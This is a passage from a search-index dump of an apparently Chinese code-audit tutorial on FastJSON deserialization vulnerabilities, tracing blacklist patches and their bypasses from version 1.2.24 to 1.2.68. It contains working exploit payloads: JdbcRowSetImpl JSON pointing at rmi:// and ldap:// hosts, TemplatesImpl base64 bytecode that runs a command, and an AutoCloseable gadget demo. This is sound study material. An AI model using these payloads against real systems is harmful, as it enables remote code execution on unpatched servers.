}","title":"JdbcRowSetImpl"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1225","text":"","title":"1.2.25"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_3","text":"1.2.24\u53ca\u4ee5\u524d\u7248\u672c\u5c31\u8ddf\u767d\u7eb8\u4e00\u6837\u968f\u4fbf\u6253\uff0c\u57281.2.25\u5f00\u59cb\u52a0\u5165\u4e86\u9ed1\u767d\u540d\u5355\u673a\u5236 \u6211\u4eec\u7ee7\u7eed\u75281.2.24\u7684payload\uff08\u8fd9\u91cc\u7528TemplatesImpl\u7684payload\uff09\u53bb\u6253\uff0c\u4f1a\u53d1\u73b0\u62a5\u9519autotype\u4e0d\u652f\u6301 \u7a76\u5176\u539f\u56e0\uff0c\u662f\u56e0\u4e3a\u5728com.alibaba.fastjson.parser.ParserConfig \u52a0\u5165\u4e86CheckAutoType\u65b9\u6cd5 com.alibaba.fastjson.parser.ParserConfig !public Class<?> checkAutoType(String typeName, Class<?> expectClass) \u5728\u5176\u4e2d\u6709\u4e2aautotypesupport\u5c5e\u6027\uff0c\u5982\u679c\u4e3afalse\uff0c\u90a3\u4e48\u5c31\u4f1a\u68c0\u6d4bjson\u4e2d@type\u7684\u503c \u5f00\u5934\u662f\u5426\u4e0e\u9ed1\u540d\u5355\u4e2d\u7684\u503c\u4e00\u6837\uff0c\u82e5\u4e00\u6837\u5c31\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5f02\u5e38\uff0c\u7136\u540e\u52a0\u8f7d\u767d\u540d\u5355\u4e2d\u7684\u7c7b if (!autoTypeSupport) { \\\\\u9ed1\u540d\u5355\u68c0\u6d4b\uff0cclassname\u662f\u4f20\u5165\u7c7b\u7684\u5168\u540d\uff0cdenyList\u662f\u9ed1\u540d\u5355 for (int i = 0; i < denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(\"autoType is not support. \" + typeName); } } for (int i = 0; i < acceptList.length; ++i) { String accept = acceptList[i]; if (className.startsWith(accept)) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass != null && expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } return clazz; } } } \u9ed1\u540d\u5355\u957f\u8fd9\u6837 \u82e5autotypesupport\u5f00\u542f\uff0c\u5219\u4f1a\u5148\u767d\u540d\u5355\u52a0\u8f7d\uff0c\u540e\u9ed1\u540d\u5355\u68c0\u6d4b if (autoTypeSupport || expectClass != null) { for (int i = 0; i < acceptList.length; ++i) { String accept = acceptList[i]; if (className.startsWith(accept)) { return TypeUtils.loadClass(typeName, defaultClassLoader); } } for (int i = 0; i < denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(\"autoType is not support. \" + typeName); } } } \u540e\u9762\u7684\u8bb8\u591a\u66f4\u65b0\u90fd\u662f\u5bf9checkAutotype\u4ee5\u53ca\u672c\u8eab\u67d0\u4e9b\u903b\u8f91\u7f3a\u9677\u5bfc\u81f4\u7684\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4ee5\u53ca\u9ed1\u540d\u5355\u7684\u4e0d\u65ad\u589e\u52a0\u3002","title":"\u66f4\u65b0\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass-1l1225-1241","text":"\u5f53autoTypeSupport\u5f00\u542f\u6216expectClass\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u4f1a\u8c03\u7528\u4e00\u4e2aloadclass\u65b9\u6cd5 if (this.autoTypeSupport || expectClass != null) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); } \u800c\u5728\u5176\u4e2d\uff0c\u82e5\u7c7b\u540d\u4ee5L\u5f00\u5934\uff1b\u7ed3\u5c3e\uff0c\u5219\u4f1a\u628a\u8fd9\u4e24\u4e2a\u5b57\u7b26\u53bb\u6389\u5e76\u52a0\u8f7d\u7c7b\u3002 \u201c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u79cd\u5947\u602a\u7684\u5904\u7406\uff0cL \u548c ; \u8fd9\u4e00\u5bf9\u5b57\u7b26\u5176\u5b9e\u662f JVM \u5b57\u8282\u7801\u4e2d\u7528\u6765\u8868\u793a\u7c7b\u540d\u7684\uff1a\u201d if (className.startsWith(\"L\") && className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } \u6240\u4ee5\u5728autotypesupport\u5f00\u542f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765bypass {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://ip:1099\",\"autoCommit\":true} \u5982\u4f55\u5f00\u542fautotypesupport\uff1f\u53ea\u9700\u5728json\u88ab\u89e3\u6790\u524d\u52a0\u5165\u5982\u4e0b\u4ee3\u7801\u5373\u53ef ParserConfig.getGlobalInstance().setAutoTypeSupport(true);","title":"bypass 1\uff08L;\u6cd5\uff091.2.25-1.2.41"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass-2json1225-1247","text":"1.2.25-1.2.32\u7248\u672c\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u53cd\u800c\u4e0d\u80fd\u6210\u529f\u89e6\u53d1\uff1b 1.2.33-1.2.47\u7248\u672c\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528\uff1b { \"a\":{ \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true } }","title":"bypass 2\uff08json\u5185\u7f6e\uff091.2.25-1.2.47"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1242","text":"","title":"1.2.42"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_4","text":"42\u7248\u672c\u4e2d\u5f00\u53d1\u4eba\u5458\u5c06\u660e\u6587\u9ed1\u540d\u5355\u6539\u6210\u4e86hash\u9ed1\u540d\u5355\uff0c\u5df2\u7ecf\u6709\u4eba\u78b0\u649e\u51fa\u4e86\u4e0d\u5c11\uff0c\u610f\u4e49\u4e0d\u5927\uff1b\u5728\u5904\u740625\u9ed1\u540d\u5355\u7ed5\u8fc7\u7684\u65f6\u5019\u505a\u4e86\u4e00\u4e2a\u6821\u9a8c\uff0c\u5982\u679c\u7c7b\u540d\u4ee5 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e\uff0c\u5219\u4f1a\u7528stubstring\u5904\u7406\u4e00\u4e0b(\u8fd9\u4e2a\u5224\u65ad\u662f\u7531HASH\u6765\u5224\u65ad\u7684\uff0c\u770b\u4e0d\u61c2\uff0c\u4f46\u6211\u5927\u53d7\u9707\u64bc\uff09\uff1a if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) { className = className.substring(1, className.length() - 1); }","title":"\u66f4\u65b0\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass","text":"\u90a3\u4e48\u76f4\u63a5\u4e00\u624b\u53cc\u5199\u7ed5\u8fc7 { \"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://127.0.0.1:2357/Command8\", \"autoCommit\":true }","title":"bypass\uff08\u53cc\u5199\u7ed5\u8fc7\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1242_1","text":"","title":"1.2.42"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_5","text":"\u9488\u5bf9\u53cc\u5199\u7ed5\u8fc7\u5957\u4e86\u4e2a\u5b50\u5224\u65ad\u3002 if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) { if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) { throw new JSONException(\"autoType is not support. \" + typeName); } className = className.substring(1, className.length() - 1); }","title":"\u66f4\u65b0\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass_1","text":"TypeUtils.loadClass \u4e2d\u9664\u4e86\u5bf9L;\u8fdb\u884c\u5224\u65ad\uff0c\u8fd8\u6709\u5bf9[\u8fdb\u884c\u4e86\u5224\u65ad } else if (className.charAt(0) == '[') { Class<?> componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } \u56f4\u7ed5\u8fd9\u4e2a\u5c55\u5f00\uff0c\u6784\u9020\u5982\u4e0bpayload\uff0c\u5177\u4f53\u4e3a\u5565\u8fd9\u4e48\u6784\u9020\u6ca1\u6709\u7ec6\u8ddf\uff0c\u53cd\u6b63\u8ddf[\u6709\u5173 { \"@type\" : \"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[,{ \"_bytecodes\" : [\"yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw\"], \"_name\" : \"a\", \"_tfactory\" : {}, \"outputProperties\" : {} }","title":"Bypass"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1244","text":"","title":"1.2.44"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_6","text":"44\u7248\u672c\u9488\u5bf943\u7248\u672c\u7684\u7ed5\u8fc7\u4f5c\u4e86\u5904\u7406\uff0c[ \u5f00\u5934\u6216\u8005 L \u5f00\u5934 ; \u7ed3\u5c3e\u90fd\u4f1a\u629b\u51fa\u5f02\u5e38","title":"\u66f4\u65b0\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass_2","text":"JSON\u5185\u7f6e\u5b8c\u7f8e\u51fb\u7834","title":"Bypass"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1247-67","text":"","title":"1.2.47-67"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_7","text":"\u7531\u4e8e47\u4fee\u590d\u4e86JSON\u5185\u7f6e\u7ed5\u8fc7\uff0c\u8fd9\u4e9b\u7248\u672c\u91cc\u4e5f\u6ca1\u5565\u5f88\u597d\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u7f51\u4e0a\u591a\u662f\u4ece\u9ed1\u540d\u5355\u4e2d\u7ed3\u5408JNDI\u6ce8\u5165\u627e\u6f0f\u7f51\u4e4b\u9c7c\uff08\u627e\u5230\u7684\u591a\u4e3a\u7ec4\u4ef6\u7c7b\uff0c\u9700\u8981\u76ee\u6807\u673a\u5668\u4e0a\u6709\u8be5\u7ec4\u4ef6\u624d\u80fd\u6253 https://paper.seebug.org/1155/\uff09\u4ee5\u53caexpectClass\u7ed5\u8fc7AutoType","title":"\u66f4\u65b0\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1268","text":"68\u7248\u672c\u4e4b\u540e\u51fa\u73b0\u4e86\u65b0\u7684\u5b89\u5168\u63a7\u5236\u70b9safeMode\uff0c\u5982\u679c\u5f00\u542f\uff0c\u5728checkAtuoType\u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u53ea\u8981\u8bbe\u7f6e@type\u7c7b\u578b\uff0c\u60f3\u53cd\u5e8f\u5217\u5316\u6307\u5b9a\u7c7b\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u629b\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f00\u4e86safemod\u7684\u7ad9\u53ef\u4ee5\u4e0d\u7528\u770b\u4e86\u3002 \u5f53\u7136\u8fd9\u4e2a\u7248\u672cexpectClass\u7ed5\u8fc7AutoType\u662f\u53ef\u4ee5\u6253\u4e00\u6253\u7684\u3002","title":"1.2.68"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#bypass-expectclassautotype-1268","text":"\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2ademo\u5c55\u793a\u4e00\u4e0b. package org.example; import java.io.IOException; public class VulAutoCloseable implements AutoCloseable { public VulAutoCloseable(){ try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void close() throws Exception { } } \u7136\u540e\u6211\u4eec\u7684payload public class evil { public static void main(String[] args){ System.out.println(JSON.parseObject(\"{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\\"@type\\\":\\\"org.example.VulAutoCloseable\\\",\\\"cmd\\\":\\\"calc\\\"}\\n\")); } } \u6267\u884c\u540e\u5f39\u8ba1\u7b97\u5668 \u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u770b\u770b\u5177\u4f53\u662f\u600e\u4e48\u4e2a\u56de\u4e8b","title":"Bypass expectClass\u7ed5\u8fc7AutoType  &lt;=1.2.68"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_8","text":"\u4e8echeckautotype \u5904\u4e0b\u65ad\u70b9\u3002 \u53ef\u4ee5\u53d1\u73b0\u4f20\u5165\u7684typename\u662f AutoCloseable\u3002\u6b64\u65f6\u7684expectClass\u662fNULL \u5f80\u4e0b\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58Mapping\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u6b64\u7c7b\uff0c \u7136\u540e\u76f4\u63a5\u88abreturn\u4e86\uff0c\u751a\u81f3\u6ca1\u6709\u8d70autoTypeSupport\u6821\u9a8c\u3002 clazz\u88abreturn\u5230\u4e86defaultjsonparser\u91cc\uff0c\u5f80\u4e0b\u770b\u903b\u8f91\u53ef\u4ee5\u53d1\u73b0\u4ece\u5bf9clazz\u8fdb\u884c\u4e86\u4e00\u4e2adeserialze\u65b9\u6cd5\uff0c\u8ddf\u8fdb \u4f1a\u8ddf\u5230\u8fd9\u91cc\u6765 \u5f80\u4e0b\u770b\uff0c\u4f1a\u56e0\u4e3a\u7531Autocloseable\u4e0d\u80fd\u901a\u8fc7getSeeAlso\u65b9\u6cd5\u6210\u529f\u751f\u6210deserializer\u5bf9\u8c61\uff0c\u4ece\u800c\u89e6\u53d1\u7b2c\u4e8c\u8f6echeckAutoType \u7b2c\u4e8c\u8f6e\u4f20\u5165checkAutoType\u7684\u53c2\u6570\u4f9d\u6b21\u4e3a \u7b2c\u4e8c\u4e2a@type\u503c\uff0c\u7b2c\u4e00\u4e2a@type\u503c\uff0c\u548c\u4e00\u4e2a\u4e0d\u91cd\u8981\u7684lexer.getFeatures() \u8fdb\u6765checkAutoType\u540e\uff0c\u4f1a\u5148\u5bf9exceptclass\u8fdb\u884c\u767d\u540d\u5355\u6821\u9a8c\uff0cAutocloseable\u7c7b\u81ea\u7136\u662f\u968f\u4fbf\u8fc7\u6389\uff0c\u7136\u540e\u4f7fexceptClassFlag\u7f6e\u4e3atrue \u968f\u540e\u4fbf\u662f\u4e00\u4e9b\u5bf9typename\u7684\u9ed1\u767d\u540d\u5355\u6821\u9a8c\uff0c\u7531\u4e8etypename\u662forg.example.VulAutoCloseable\uff0c\u4e0d\u5728\u9ed1\u767d\u540d\u5355\u4e2d\uff0c\u6240\u4ee5\u6821\u9a8c\u81ea\u7136\u90fd\u901a\u8fc7\u4e86\u3002 \u4ee5\u4e0b\u662f\u4f9d\u6b21\u7684\u6821\u9a8c\u987a\u5e8f \u9ed1\u540d\u5355\u6821\u9a8c \u5148\u767d\u540e\u9ed1\uff0c\u5176\u4e2d\u6240\u6709\u7684Array.binarySearch\u7ed3\u679c\u90fd\u662f0\uff0c\u81ea\u7136\u5c31\u80fd\u901a\u8fc7IF\u6761\u4ef6 \u5148\u9ed1\u540e\u767d \u51b2\u7834\u91cd\u91cd\u8003\u7814\uff0ctypename\u6307\u5b9a\u7c7b\u88ab\u4f20\u5165TypeUtils.loadClass,\u8ddf\u8fdb \u4f1a\u6765\u5230\u8fd9\u91cc\uff0cVulAutoCloseable\u7684\u7c7b\u5bf9\u8c61\u88ab\u8fd4\u56de \u7136\u540e\u4f1a\u5bf9\u8fd9\u4e2a\u7c7b\u5bf9\u8c61\u8fdb\u884c\u6821\u9a8c\uff0c\u6821\u9a8c\u662f\u5426\u4e3aClassLoader\u3001DataSource\u3001RowSet\u7b49\u7c7b\u7684\u5b50\u7c7b\uff0c\u662f\u7684\u8bdd\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u8fd9\u4e5f\u662f\u8fc7\u6ee4\u5927\u591a\u6570JNDI\u6ce8\u5165Gadget\u7684\u673a\u5236\uff1a 